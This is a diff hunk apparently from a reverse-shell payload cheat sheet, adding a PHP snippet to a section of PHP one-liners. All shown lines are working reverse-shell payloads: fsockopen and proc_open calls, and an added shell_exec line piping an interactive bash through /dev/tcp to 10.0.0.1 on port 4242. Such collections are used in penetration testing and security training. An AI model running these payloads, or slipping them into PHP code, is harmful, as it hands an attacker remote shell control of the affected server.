@@ -174,6 +174,10 @@ php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
 
+```php
+<?php shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'");?>
+```
+
 ### Ruby
 
 ```ruby
